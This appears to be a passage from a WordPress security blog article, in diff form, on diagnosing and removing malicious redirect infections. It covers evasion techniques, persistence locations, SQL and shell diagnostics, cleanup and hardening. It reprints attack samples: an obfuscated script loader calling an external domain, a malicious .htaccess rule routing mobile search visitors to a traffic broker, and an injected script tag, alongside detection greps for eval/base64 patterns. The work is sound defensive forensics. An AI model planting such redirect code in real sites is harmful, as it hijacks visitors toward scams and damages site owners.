+<p>Redirect scripts parse the incoming <code>HTTP_USER_AGENT</code> string. Attackers frequently configure rules that trigger only for mobile browser tokens (<code>iPhone</code>, <code>Android</code>, <code>Mobile Safari</code>, <code>Dalvik</code>, <code>Windows Phone</code>) while ignoring desktop user agents (<code>Windows NT</code>, <code>Macintosh</code>, <code>X11</code>). Desktop developers testing the site never encounter the condition.</p>
+<h4>2. Search Engine Referrer Filtering</h4>
+<p>Attackers want organic consumers, not administrators navigating directly to the URL. The malware inspects the <code>HTTP_REFERER</code> header:</p>
+<ul>
+<li>If the referrer is blank (direct navigation) or originates from your own domain, the redirect sleeps.</li>
+<li>If the referrer matches search engines (<code>google.com</code>, <code>bing.com</code>, <code>yahoo.com</code>, <code>duckduckgo.com</code>) or major social networks, the script executes.</li>
+</ul>
+<p>This mirrors the cloaking mechanisms analyzed in our forensic investigation of the <a href="/blog/japanese-keyword-hack-wordpress">Japanese Keyword Hack on WordPress</a>.</p>
+<h4>3. Logged-In User &amp; Administrator Cookie Suppression</h4>
+<p>Threat actors check for the presence of native WordPress authentication cookies:</p>
+<ul>
+<li><code>wordpress_logged_in_*</code></li>
+<li><code>wp-settings-*</code></li>
+<li><code>wordpress_test_cookie</code></li>
+</ul>
+<p>If an administrator or editor is logged into the WordPress dashboard in their active browser session, the redirect is completely suppressed across the entire front end. The moment the administrator logs out or opens an unauthenticated incognito window, the redirect conditions can fire.</p>
+<h4>4. Frequency Capping via Cookies and LocalStorage</h4>
+<p>To prevent victims from noticing recurring redirect patterns and raising alarms, attackers enforce frequency limits. When a redirect fires, the script sets an innocuous-looking client-side cookie (such as <code>_utm_session_v=1</code> or <code>wp_last_visit=timestamp</code>) with an expiration of 24 to 72 hours. Subsequent requests from that device within the time window load the authentic site cleanly.</p>
+<h4>5. IP Geolocation and Network Filtering</h4>
+<p>Threat actors configure server-side databases (such as MaxMind GeoIP) or query external IP lookup APIs to restrict redirects to wealthy consumer demographics (e.g., tier-1 countries: United States, United Kingdom, Canada, Australia, Germany) while whitelisting IP ranges associated with hosting datacenters, cloud security scanners, and the site's local hosting provider.</p>
+<h4>6. Time-Delayed and Interaction-Based Execution</h4>
+<p>Rather than redirecting on page load, modern JavaScript payloads bind event listeners to user interactions:</p>
+<ul>
+<li><code>document.addEventListener('click', ...)</code>: The first click anywhere on the page—even on dead whitespace—opens a pop-under tab routing to the malicious destination.</li>
+<li><code>window.addEventListener('scroll', ...)</code>: Redirection triggers only after the visitor has scrolled 500 pixels down the page, ensuring automated headless crawlers (which rarely simulate deep scroll events) miss the trigger.</li>
+</ul>
+<h4>7. Search Crawler and Bot Exemption</h4>
+<p>To avoid detection by automated Googlebot security scans and search quality evaluators, the redirect script checks for common crawler user-agents (<code>Googlebot</code>, <code>bingbot</code>, <code>Baiduspider</code>, <code>YandexBot</code>). The malware serves 100% clean, pristine content to search crawlers, ensuring the site retains its organic rankings while real human search visitors are diverted to affiliate scams.</p>
+<p>Evaluating these seven evasion vectors clarifies why manual browsing tests are inadequate. Rigorous diagnosis requires programmatic multi-vector HTTP simulation.</p>
+<hr />
+<h2>3. The Major Redirect Persistence Locations</h2>
+<p>Where does redirect code conceal itself inside a WordPress ecosystem? Because WordPress relies on a flexible, modular architecture, malicious logic can reside across ten distinct filesystem and database zones.</p>
+<pre><code>/var/www/html/
+├── .htaccess                     ◄── Rogue rewrite rules routing traffic at server layer
+├── .user.ini                     ◄── auto_prepend_file loading external scripts on all requests
+├── wp-config.php                 ◄── Obfuscated PHP base64 code injected above core constants
+├── wp-blog-header.php            ◄── Tampered core loader executing redirects on site entry
+├── wp-includes/
+│   ├── wp-tmp.php                ◄── Standalone dropper script masquerading as core asset
+│   └── template-loader.php       ◄── Tampered core file firing wp_redirect() hooks
+├── wp-content/
+│   ├── mu-plugins/
+│   │   └── sso-security.php      ◄── Must-Use plugin executing before standard plugins
+│   ├── plugins/
+│   │   └── legitimate-plugin/    ◄── Appended script code inside real plugin files
+│   ├── themes/
+│   │   └── active-theme/
+│   │       ├── header.php        ◄── Injected inline &lt;script&gt; redirect tags
+│   │       └── functions.php     ◄── Hidden admin hooks and template_redirect callbacks
+│   └── uploads/
+│       └── 2025/08/
+│           └── icon.png.php      ◄── Backdoor dropper serving as C2 redirect broker
+└── MySQL Database (wp_options)   ◄── Serialized script tags in 'siteurl', 'home', or transients
+</code></pre>
+<h3>1. WordPress Theme Templates (<code>header.php</code>, <code>footer.php</code>, <code>functions.php</code>)</h3>
+<p>Active themes are prime targets because they directly construct the HTML document returned to visitors:</p>
+<ul>
+<li>In <code>header.php</code>: Attackers insert minified or encoded JavaScript tags directly before the closing <code>&lt;/head&gt;</code> tag.</li>
+<li>In <code>functions.php</code>: Attackers append PHP hooks that intercept WordPress routing (<code>add_action('template_redirect', ...)</code>).</li>
+</ul>
+<h3>2. Must-Use Plugins (<code>/wp-content/mu-plugins/</code>)</h3>
+<p>The <code>mu-plugins</code> directory is a critical architectural blind spot. Any single PHP file placed here is automatically executed by WordPress in alphabetical order before any standard plugins initialize. Crucially, Must-Use plugins <strong>do not appear in the standard WordPress Plugins dashboard</strong>, cannot be deactivated through the UI, and survive standard plugin updates.</p>
+<h3>3. Server Configuration Files (<code>.htaccess</code> &amp; <code>.user.ini</code>)</h3>
+<p>On Apache and LiteSpeed servers, <code>.htaccess</code> files permit directory-level rewrite rules. Attackers insert conditional rules directly at the top of the file before WordPress's standard <code># BEGIN WordPress</code> block. On PHP FastCGI environments, attackers leverage <code>.user.ini</code> to set <code>auto_prepend_file = /path/to/malicious_loader.php</code>, executing malicious redirect logic globally across every PHP execution without modifying a single WordPress file.</p>
+<h3>4. Core File Masquerading (<code>/wp-includes/</code> &amp; Root)</h3>
+<p>Core files are frequently tampered with or paired with imitation files. Attackers inject redirect functions into legitimate core files like <code>wp-blog-header.php</code>, <code>wp-settings.php</code>, or drop fake classes like <code>wp-includes/class-wp-session-cache.php</code>. For an in-depth analysis of how stealth droppers masquerade across core file trees, review our companion guide on <a href="/blog/wordpress-backdoors-stealth-web-shells">WordPress Backdoors &amp; Stealth Web Shells</a>.</p>
+<h3>5. The Database Layer (<code>wp_options</code> &amp; <code>wp_posts</code>)</h3>
+<p>Persistence within the database is common because standard filesystem security scans never inspect database tables:</p>
+<ul>
+<li>In <code>wp_options</code>: Checking the <code>siteurl</code> and <code>home</code> records. A subtle modification (e.g., changing <code>https://example.com</code> to <code>https://examp1e.com</code> or injecting query parameters) redirects all application traffic.</li>
+<li>Autoloaded transients in <code>wp_options</code>: Injecting base64-encoded redirect scripts into options set to <code>autoload = 'yes'</code>.</li>
+<li>Post content in <code>wp_posts</code>: Injecting malicious <code>&lt;script&gt;</code> or <code>&lt;iframe&gt;</code> tags into post bodies, executing client-side redirects whenever specific high-traffic articles are viewed.</li>
+</ul>
+<hr />
+<h2>4. Injected JavaScript Redirects</h2>
+<p>Client-side JavaScript redirects represent the most widespread vector for browser hijacking. Rather than tampering with server daemons, attackers exploit arbitrary file upload flaws, compromised administrator accounts, or vulnerable theme file editors to inject JavaScript into template headers or database rows.</p>
+<h3>Forensic Indicators of Malicious Injected JavaScript</h3>
+<h4>1. Dynamic Script Element Creation</h4>
+<p>Malicious scripts avoid embedding obvious external URLs directly in HTML source code. Instead, they dynamically assemble DOM script nodes:</p>
+<pre><code class="language-javascript">// DEFENSIVE FORENSIC PATTERN: How injected scripts dynamically load external gates
+(function() {
+    var d = document;
+    var s = d.createElement('script');
+    // Assembling obfuscated domain strings via string manipulation or decoding
+    s.src = 'https://' + String.fromCharCode(115,116,97,116,115) + '.external-metrics-gate.com/tr.js';
+    s.async = true;
+    d.getElementsByTagName('head')[0].appendChild(s);
+})();
+</code></pre>
+<h4>2. Obfuscation Sinks and String Encoding</h4>
+<p>Attackers wrap payloads in layered encoding routines to evade basic text-matching filters:</p>
+<ul>
+<li><strong>String.fromCharCode / Hex / Octal:</strong> Encoding malicious URLs into ASCII numeric arrays (<code>[104, 116, 116, 112, 115...]</code>).</li>
+<li><strong>Base64 Encoding (<code>window.atob</code>):</strong> Encoding redirection strings and invoking runtime evaluation via <code>eval()</code> or <code>Function()</code>.</li>
+<li><strong>String Splitting and Concatenation:</strong> Fragmenting domain names across multiple variables (<code>var a = "loca"; var b = "tion"; window[a + b].href = ...</code>).</li>
+</ul>
+<h4>3. Hidden IFrames and Pop-Under Windows</h4>
+<p>Rather than navigating the active tab away immediately (which alerts the user instantly), malicious scripts create invisible iframes:</p>
+<ul>
+<li>Injecting an iframe with <code>width="0" height="0" style="display:none"</code> to trigger background affiliate cookie stuffing, browser fingerprinting, or exploit kit probing.</li>
+<li>Utilizing <code>window.open()</code> inside simulated user click handlers to open the redirect target in a new background tab while keeping the original site visible in the foreground.</li>
+</ul>
+<h4>4. Hooking DOM Navigation and Event Listeners</h4>
+<p>Advanced redirect malware hooks native browser navigation methods. The script intercepts internal link clicks: when a visitor clicks an authentic internal link (e.g., navigating from <code>/about</code> to <code>/contact</code>), the script cancels the default event (<code>e.preventDefault()</code>) and redirects the user to an external domain.</p>
+<hr />
+<h2>5. Conditional .htaccess and Server Rewrite Hijacks</h2>
+<p>When redirection occurs at the server daemon layer, Apache or LiteSpeed processes rewrite rules before WordPress core files or PHP scripts are even read from disk.</p>
+<h3>Analyzing Malicious <code>.htaccess</code> Directives</h3>
+<p>Attackers exploit the Apache <code>mod_rewrite</code> module by combining <code>RewriteCond</code> (conditions) with <code>RewriteRule</code> (actions):</p>
+<pre><code class="language-apache">## DEFENSIVE PATTERN ANALYSIS: Deconstructing malicious conditional rewrite rules
+&lt;IfModule mod_rewrite.c&gt;
+RewriteEngine On
+
+## 1. Condition: Evaluate incoming User-Agent for mobile devices
+RewriteCond %{HTTP_USER_AGENT} (android|iphone|ipad|mobile|touch|blackberry) [NC]
+
+## 2. Condition: Evaluate incoming Referrer for search engines
+RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo|yandex) [NC]
+
+## 3. Condition: Ensure request is not targeting wp-admin or legitimate assets
+RewriteCond %{REQUEST_URI} !^/(wp-admin|wp-login\.php|wp-content/plugins) [NC]
+
+## 4. Action: Route matched traffic to external Traffic Distribution System
+RewriteRule ^.*$ https://gateway.traffic-broker-network.com/click?subid=wp [R=302,L]
+&lt;/IfModule&gt;
+</code></pre>
+<h3>Forensic Anatomy of the Attack:</h3>
+<ol>
+<li><strong>Target Gating:</strong> The first two <code>RewriteCond</code> directives enforce the attacker's commercial filter: the redirect <strong>only</strong> executes if the user is on a mobile device <strong>and</strong> arrived from a search engine.</li>
+<li><strong>Stealth Protection:</strong> The third <code>RewriteCond</code> explicitly excludes <code>/wp-admin</code> and login endpoints. If an administrator visits their dashboard, the rule does not apply, keeping the compromise hidden.</li>
+<li><strong>Execution Flag:</strong> The <code>[R=302,L]</code> flag delivers an immediate HTTP 302 Found response, terminating request processing instantly (<code>L</code> = Last rule).</li>
+</ol>
+<h3>Hidden and Nested <code>.htaccess</code> Files</h3>
+<p>A frequent investigation mistake is inspecting only the root <code>.htaccess</code> file (<code>/var/www/html/.htaccess</code>). Apache allows directory-level overrides:</p>
+<ul>
+<li>Attackers drop rogue <code>.htaccess</code> files inside <code>/wp-content/</code>, <code>/wp-content/uploads/</code>, <code>/wp-content/themes/</code>, or <code>/wp-includes/</code>.</li>
+<li>A <code>.htaccess</code> file nestled inside an uploads folder can override parent configuration directives, executing redirect logic whenever static assets or media files are requested.</li>
+</ul>
+<h3>Apache vs. Nginx Investigation Differences</h3>
+<ul>
+<li><strong>Apache / LiteSpeed:</strong> Relies on dynamic <code>.htaccess</code> files parsed at runtime on every request. Site owners can inspect and modify these files directly via SFTP or CLI.</li>
+<li><strong>Nginx:</strong> Does not support <code>.htaccess</code>. All rewrite logic is compiled into static configuration blocks within <code>/etc/nginx/nginx.conf</code> or <code>/etc/nginx/sites-enabled/</code>. If an Nginx server is executing server-level redirects, the attacker must have gained root or sudo access to tamper with the Nginx virtual host files, or the compromise is occurring downstream within the PHP FastCGI execution pipeline via <code>.user.ini</code>.</li>
+</ul>
+<hr />
+<h2>6. Mobile-Only Redirects: Threat Signals vs. Legitimate Routing</h2>
+<p>One of the most complex triage scenarios involves investigating reports of mobile-only redirection. Responders must exercise discipline: <strong>mobile-only behavior is an urgent threat signal that requires forensic investigation, but it is not inherently proof of malware.</strong></p>
+<pre><code>┌────────────────────────────────────────────────────────────────────────┐
+│             MOBILE REDIRECTION: LEGITIMATE VS. MALICIOUS               │
+├─────────────────────┬───────────────────┬──────────────────────────────┤
+│ Attribute           │ Legitimate Mobile │ Malicious Mobile Hijack      │
+│                     │ Optimization      │                              │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Destination Domain  │ Same brand domain │ External, unrelated, or      │
+│                     │ (m.site.com, etc.)│ obfuscated domain.           │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Referrer Dependency │ Fires uniformly   │ Triggers only from search    │
+│                     │ across all mobile │ engines or external links;   │
+│                     │ entry points.     │ direct navigation is clean.  │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Browser Navigation  │ Preserves user    │ Traps browser history;       │
+│ History             │ back-button flow. │ disables back button.        │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Administrative      │ Visible and       │ Hidden from logged-in users; │
+│ Visibility          │ configurable in WP│ zero settings in dashboard.  │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Target Page Content │ Responsive layout │ Adware, tech scams, betting, │
+│                     │ of authentic site │ adult gates, phishing.       │
+└─────────────────────┴───────────────────┴──────────────────────────────┘
+</code></pre>
+<h3>Why Attackers Prioritize Mobile Visitors</h3>
+<ol>
+<li><strong>Higher Mobile Ad Arbitrage Payouts:</strong> Mobile traffic commands premium monetization rates for carrier billing scams (e.g., auto-subscribing users to premium SMS services via WAP billing gateways).</li>
+<li><strong>Reduced DevTools Inspection:</strong> Mobile users cannot easily right-click to "Inspect Element", open network waterfalls, or check console logs.</li>
+<li><strong>URL Bar Truncation:</strong> Mobile browsers collapse the address bar to save screen space, making long, fraudulent phishing URLs harder for casual users to detect.</li>
+</ol>
+<h3>Distinguishing Legitimate Mobile Routing from Malware</h3>
+<p>Before declaring an intrusion, confirm whether legitimate architectural plugins are active:</p>
+<ul>
+<li><strong>Legacy Mobile Themes:</strong> Old plugins (such as WPtouch or mobile redirection extensions) route mobile visitors to alternate URLs.</li>
+<li><strong>Responsive Subdomains:</strong> Legacy enterprise platforms route to <code>m.yourdomain.com</code>.</li>
+<li><strong>Deep Linking to Native Apps:</strong> Mobile smart banners or app-indexing tags designed to open iOS/Android applications.</li>
+</ul>
+<p>If the redirect routes users to external domains offering tech support software, fake antivirus alerts, or casino registrations, the behavior is unquestionably malicious.</p>
+<hr />
+<h2>7. Database-Driven Redirects</h2>
+<p>When an incident responder replaces all core, theme, and plugin files with clean archives, yet the redirects persist, the infection almost certainly resides within the database.</p>
+<h3>High-Risk Database Entities</h3>
+<h4>1. Site Identity Options in <code>wp_options</code></h4>
+<p>The <code>wp_options</code> table contains the authoritative URLs governing your entire WordPress installation:</p>
+<ul>
+<li><code>siteurl</code>: The physical address where your WordPress core files reside.</li>
+<li><code>home</code>: The public address visitors type into their address bar.</li>
+</ul>
+<p>Attackers manipulate these records via direct SQL injection or unauthenticated REST API vulnerabilities. Changing <code>home</code> to an external destination routes all visitor traffic away immediately.</p>
+<h4>2. Autoloaded Transients and Options</h4>
+<p>WordPress loads all records marked with <code>autoload = 'yes'</code> into server memory on every single web page request. Attackers exploit this by storing Base64-encoded redirect payloads inside oversized option values:</p>
+<ul>
+<li>Disguised option names: <code>wp_system_options</code>, <code>theme_mods_cache</code>, <code>site_stats_transient</code>.</li>
+<li>When an active theme's <code>header.php</code> executes <code>get_option('wp_system_options')</code>, it pulls the script from the database and prints it directly into the HTML document.</li>
+</ul>
+<h4>3. Post and Page Content Injections (<code>wp_posts</code>)</h4>
+<p>Rather than injecting global templates, attackers run batch SQL updates across the <code>post_content</code> column in <code>wp_posts</code>:</p>
+<ul>
+<li>Appending <code>&lt;script src="https://traffic-node.com/c.js"&gt;&lt;/script&gt;</code> to the end of every published blog post.</li>
+<li>Injecting malicious iframes into popular landing pages.</li>
+<li>Altering external hyperlink anchors across historical content to route through affiliate redirect gates.</li>
+</ul>
+<h4>4. Custom Field Metadata (<code>wp_postmeta</code>)</h4>
+<p>Attackers hook into custom metadata schemas (such as Advanced Custom Fields or page builder metadata) to store script payloads that are evaluated by page templates during layout rendering.</p>
+<h3>Read-Only SQL Diagnostic Queries</h3>
+<p>Never perform blind database searches. Use targeted, read-only SQL queries to inspect suspicious database records:</p>
+<pre><code class="language-sql">-- 1. Inspect core site and home URLs
+SELECT option_id, option_name, option_value 
+FROM wp_options 
+WHERE option_name IN ('siteurl', 'home');
+
+-- 2. Identify abnormally large autoloaded options (&gt; 50KB)
+SELECT option_id, option_name, LENGTH(option_value) AS value_size_bytes 
+FROM wp_options 
+WHERE autoload = 'yes' 
+ORDER BY value_size_bytes DESC 
+LIMIT 20;
+
+-- 3. Search for common redirect indicators inside post content
+SELECT ID, post_title, post_status 
+FROM wp_posts 
+WHERE post_status = 'publish' 
+AND (
+    post_content LIKE '%&lt;script%window.location%' OR
+    post_content LIKE '%&lt;meta http-equiv="refresh"%' OR
+    post_content LIKE '%document.createElement(\'script\')%'
+)
+LIMIT 20;
+
+-- 4. Audit active plugins registered in the database
+SELECT option_value 
+FROM wp_options 
+WHERE option_name = 'active_plugins';
+</code></pre>
+<hr />
+<h2>8. Forensic Investigation Workflow (10-Stage Protocol)</h2>
+<p>Remediating a redirect infection without structured evidence gathering leads to repeated reinfection. Follow this disciplined 10-stage protocol to isolate, diagnose, and eradicate the compromise.</p>
+<pre><code>[Stage 01: Reproduce Trigger] ──► [Stage 02: Capture HTTP Waterfall] ──► [Stage 03: Request Matrix Testing]
+                                                                                       │
+┌──────────────────────────────────────────────────────────────────────────────────────┘
+│
+▼
+[Stage 04: Server Config Audit] ──► [Stage 05: Filesystem Sweep] ──► [Stage 06: Integrity Checksums]
+                                                                                       │
+┌──────────────────────────────────────────────────────────────────────────────────────┘
+│
+▼
+[Stage 07: Database Audit] ──► [Stage 08: Root Cause Analysis] ──► [Stage 09: Surgical Eradication]
+                                                                                       │
+┌──────────────────────────────────────────────────────────────────────────────────────┘
+│
+▼
+[Stage 10: Multi-Vector Validation &amp; Hardening Lockdown]
+</code></pre>
+<h3>Stage 01: Reproduce the Redirect</h3>
+<p>Document the exact conditions required to trigger the redirect. Note whether it occurs on desktop vs. mobile, direct URL entry vs. Google search click, or only during specific hours.</p>
+<h3>Stage 02: Capture HTTP Behavior</h3>
+<p>Execute CLI HTTP requests to capture response headers, status codes (<code>301</code>, <code>302</code>, <code>200 OK</code>), and the exact <code>Location:</code> target URL before following any redirect hops.</p>
+<h3>Stage 03: Compare Request Variants</h3>
+<p>Execute a structured matrix of requests varying User-Agents (Desktop Chrome vs. iPhone Safari) and Referrers (blank vs. Google organic). Pinpoint whether the redirect is triggered by user-agent, referrer, or session cookies.</p>
+<h3>Stage 04: Inspect Server Configuration</h3>
+<p>Audit <code>.htaccess</code> files across the root directory and all nested directories. Inspect <code>.user.ini</code>, <code>php.ini</code>, and web server virtual host configurations (Nginx server blocks or Apache vhosts).</p>
+<h3>Stage 05: Inspect the WordPress Filesystem</h3>
+<p>Audit high-risk persistence paths: <code>/wp-content/mu-plugins/</code>, active theme directories, <code>/wp-content/uploads/</code>, and root files. Search for recently modified files (<code>mtime</code>/<code>ctime</code>) within the compromise window.</p>
+<h3>Stage 06: Verify Core, Plugin, and Theme Integrity</h3>
+<p>Execute cryptographic checksum validation against official repository archives to detect tampered core files or injected plugin binaries.</p>
+<h3>Stage 07: Audit Database Persistence</h3>
+<p>Execute targeted SQL queries against <code>wp_options</code>, <code>wp_posts</code>, and <code>wp_usermeta</code>. Unpack serialized transients and inspect autoloaded options exceeding normal size limits.</p>
+<h3>Stage 08: Identify Initial Compromise Vector</h3>
+<p>Examine web server access logs correlating with the file modification timestamps. Determine whether the attacker entered through an unpatched plugin vulnerability, compromised SFTP credentials, or a rogue administrator account. When attackers establish secondary persistent web shells or cron droppers to continuously reinject redirect code, incident response teams must deploy targeted <a href="/services/wordpress-backdoor-removal">WordPress Backdoor Removal</a> protocols to eliminate hidden persistence mechanisms.</p>
+<h3>Stage 09: Coordinated Surgical Eradication</h3>
+<p>Take an offline backup for evidence preservation. Concurrently purge malicious database entries, replace tampered core and plugin software with pristine binaries, clean server configuration files, and reset all authentication credentials.</p>
+<h3>Stage 10: Multi-Vector Re-testing &amp; Validation</h3>
+<p>Rerun automated HTTP simulations across all device profiles and referrers to confirm the platform consistently delivers authentic <code>200 OK</code> HTML.</p>
+<p>If your team lacks the internal tooling to execute this multi-stage triage, our comprehensive <a href="/services/wordpress-malware-removal">WordPress Malware Removal &amp; Hacked Site Recovery</a> team provides full-stack forensic remediation.</p>
+<hr />
+<h2>9. Safe Diagnostic Commands</h2>
+<p>Never rely solely on visual dashboard inspections. Use these battle-tested, read-only diagnostic commands via SSH terminal access to evaluate your environment safely.</p>
+<pre><code class="language-bash">## 1. SIMULATION: Test standard desktop request (Expect clean 200 OK)
+curl -I -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://example.com/
+
+## 2. SIMULATION: Test mobile device arriving from Google Search
+## Tests both mobile User-Agent AND Google HTTP Referer
+curl -I -s \
+  -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1" \
+  -e "https://www.google.com/" \
+  https://example.com/
+
+## 3. HTTP HEADER CAPTURE: Trace entire redirection chain without executing JavaScript
+curl -sIL \
+  -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)" \
+  -e "https://www.google.com/" \
+  https://example.com/ | grep -Ei "^(HTTP|Location:)"
+
+## 4. CHECKSUM: Cryptographically verify WordPress core binaries against official release
+wp core verify-checksums
+
+## 5. CHECKSUM: Cryptographically verify installed WordPress.org plugins
+wp plugin verify-checksums
+
+## 6. FILESYSTEM: Scan theme and plugin files for common JS redirect patterns (read-only)
+grep -rEi --include="*.php" --include="*.js" "(window\.location\.(href|replace)|document\.location|location\.href)\s*=" /var/www/html/wp-content/themes/
+
+## 7. FILESYSTEM: Search for base64 decoding paired with eval execution
+grep -rEi --include="*.php" "(eval|passthru|shell_exec)\s*\(.*base64_decode" /var/www/html/wp-content/
+
+## 8. SERVER CONFIG: List all .htaccess files across the entire webroot
+find /var/www/html/ -type f -name ".htaccess" -ls
+
+## 9. SERVER CONFIG: Search for suspicious auto_prepend_file directives in .user.ini or php.ini
+grep -rEi "auto_prepend_file" /var/www/html/
+
+## 10. TIMELINE: Find all PHP files modified in the last 7 days
+find /var/www/html/ -type f -name "*.php" -mtime -7 -ls
+</code></pre>
+<hr />
+<h2>10. Redirect Chains, SEO Damage, and Search Behavior</h2>
+<p>A redirect infection left unresolved can devastate an organization's search visibility, brand reputation, and domain authority within days.</p>
+<h3>How Malicious Redirects Poison Organic Search</h3>
+<pre><code>[Infected Site Serves Clean 200 OK to Desktop Googlebot]
+                           │
+                           ▼
+  [Mobile Googlebot Crawls Site &amp; Detects HTTP 302 Redirect]
+                           │
+                           ▼
+┌────────────────────────────────────────────────────────┐
+│ Google Evaluates Destination URL:                      │
+│ - Flagged as Known Phishing / Scam / Adware Domain     │
+└──────────────────────────┬─────────────────────────────┘
+                           │
+                           ▼
+┌────────────────────────────────────────────────────────┐
+│ Search Penalties &amp; Security Flags Applied:             │
+│ 1. Red Warning Screen: "Deceptive site ahead"          │
+│ 2. Site Demoted in Organic Search Results              │
+│ 3. URL Title Rewritten to Warn Searchers               │
+│ 4. Ad Campaigns Suspended (Google Ads / Meta Ads)      │
+└────────────────────────────────────────────────────────┘
+</code></pre>
+<h3>Critical Consequences of Traffic Hijacking:</h3>
+<ol>
+<li><strong>Google Safe Browsing Blacklisting:</strong> When Google's security systems detect that your domain routes users to deceptive endpoints, Google flags your domain globally. Visitors using Chrome, Firefox, or Safari are greeted with a full-screen red warning interstitial (<em>"The site ahead contains harmful programs"</em>), driving bounce rates to 100%.</li>
+<li><strong>Crawl Budget and Canonical Dissolution:</strong> If search engine crawlers encounter temporary or permanent redirects on your primary URLs, search algorithms may canonicalize your high-ranking pages to the malicious destination, stripping your titles and meta descriptions from search results.</li>
+<li><strong>Soft 404 Penalties and Deindexing:</strong> If the redirect routes to broken or parked domains, search engines register soft 404 errors, systematically dropping your legitimate landing pages from organic indexes.</li>
+<li><strong>Immediate Paid Ad Suspension:</strong> Google Ads and Meta Ads run automated landing page validation bots. If a redirect fires on their tracking clicks, your advertising accounts face immediate suspension for "Circumventing Systems" or "Malicious or Unwanted Software"—penalties that can take weeks to appeal.</li>
+</ol>
+<hr />
+<h2>11. Eradication and Post-Cleanup Validation</h2>
+<p>Once the forensic evidence is cataloged, execute this comprehensive eradication workflow to restore system integrity.</p>
+<h3>Step 1: Evidence Preservation &amp; Environment Isolation</h3>
+<ul>
+<li>Create an offline compressed tarball of the entire filesystem (<code>tar -czf compromised_backup.tar.gz /var/www/html</code>).</li>
+<li>Generate an immediate MySQL database dump (<code>mysqldump -u root -p database_name &gt; db_evidence.sql</code>).</li>
+<li>Place the site in maintenance mode or restrict public web access via IP allowlisting at the cloud WAF level (e.g., Cloudflare) to prevent attackers from executing remote commands during cleanup.</li>
+</ul>
+<h3>Step 2: Clean Binary Reinstallation (Core &amp; Plugins)</h3>
+<p>Never attempt to manually clean infected core or plugin files line-by-line:</p>
+<ol>
+<li><strong>Core Replacement:</strong> Delete <code>/wp-admin/</code>, <code>/wp-includes/</code>, and all root PHP files (preserving only <code>wp-config.php</code> and <code>/wp-content/</code>). Download a clean release from <code>WordPress.org</code> and unpack pristine core binaries.</li>
+<li><strong>Plugin Reinstallation:</strong> Delete the entire <code>/wp-content/plugins/</code> directory. Download and restore clean copies of all active plugins directly from official repositories. Permanently delete inactive plugins.</li>
+<li><strong>Theme Audit:</strong> Reinstall off-the-shelf themes from developer sources. For custom bespoke themes, perform a meticulous <code>git diff</code> comparison against your version-controlled code repository to isolate every extraneous line of injected code.</li>
+</ol>
+<h3>Step 3: Sanitize the Uploads Directory</h3>
+<ul>
+<li>Recursively scan <code>/wp-content/uploads/</code> and delete all <code>.php</code>, <code>.phtml</code>, <code>.phar</code>, <code>.ico</code>, or executable script files.</li>
+<li>Remove any rogue <code>.htaccess</code> or <code>.user.ini</code> files planted inside media folders.</li>
+</ul>
+<h3>Step 4: Database Sanitization</h3>
+<ul>
+<li>Audit <code>wp_options</code>: Verify <code>siteurl</code> and <code>home</code> records.</li>
+<li>Delete transients (<code>wp transient delete --all</code>).</li>
+<li>Inspect high-byte autoloaded options and purge unfamiliar records.</li>
+<li>Search <code>wp_posts</code> for injected <code>&lt;script&gt;</code> or <code>&lt;iframe&gt;</code> tags and strip malicious injections.</li>
+</ul>
+<h3>Step 5: Server Configuration Reset</h3>
+<ul>
+<li>Replace the root <code>.htaccess</code> file with WordPress's default clean configuration:<pre><code class="language-apache"># BEGIN WordPress
+&lt;IfModule mod_rewrite.c&gt;
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+&lt;/IfModule&gt;
+# END WordPress
+</code></pre>
+</li>
+<li>Remove rogue <code>.user.ini</code> files containing <code>auto_prepend_file</code>.</li>
+</ul>
+<h3>Step 6: Invalidate Credentials and Sessions</h3>
+<ul>
+<li><strong>Regenerate Salts:</strong> Update all security keys and salts in <code>wp-config.php</code> via the official WordPress salt API (<code>https://api.wordpress.org/secret-key/1.1/salt/</code>), instantly terminating all active browser cookies and sessions.</li>
+<li><strong>Reset Passwords:</strong> Force password updates across all database users and administrator accounts.</li>
+<li><strong>Rotate Infrastructure Keys:</strong> Update SFTP, SSH, hosting control panel, and MySQL database passwords.</li>
+</ul>
+<h3>Step 7: Flush All Caching Layers</h3>
+<p>Purge all application, server, and edge caches:</p>
+<ul>
+<li>Flush object caches (Redis, Memcached).</li>
+<li>Clear server caching modules (Nginx FastCGI cache, LiteSpeed Cache).</li>
+<li>Purge edge CDN caches globally (Cloudflare, Fastly, AWS CloudFront).</li>
+</ul>
+<h3>Step 8: Multi-Device Retesting &amp; Search Console Appeal</h3>
+<p>Rerun programmatic <code>curl</code> simulations across desktop and mobile profiles. Once clean operation is confirmed, submit a formal Security Review request via Google Search Console, providing concise technical documentation confirming that malicious files were purged, software was restored from official repositories, and database sanitization is complete.</p>
+<hr />
+<h2>12. Hardening Against Redirect Reinfection</h2>
+<p>Cleaning malware without eliminating the vulnerability that enabled the compromise invites immediate reinfection. Implement these defense-in-depth architectural safeguards to fortify your production environment.</p>
+<pre><code>┌────────────────────────────────────────────────────────────────────────┐
+│                   DEFENSE-IN-DEPTH HARDENING MATRIX                    │
+├─────────────────────┬──────────────────────────────────────────────────┤
+│ Architectural Layer │ Hardening Implementation Directive               │
+├─────────────────────┼──────────────────────────────────────────────────┤
+│ Edge Perimeter      │ - Web Application Firewall (WAF) OWASP rulesets. │
+│                     │ - Rate limiting on /wp-login.php &amp; /xmlrpc.php.  │
+├─────────────────────┼──────────────────────────────────────────────────┤
+│ Web Server Daemon   │ - Deny PHP execution in /wp-content/uploads/.    │
+│                     │ - Protect hidden dotfiles (.git, .env, .user.ini)│
+├─────────────────────┼──────────────────────────────────────────────────┤
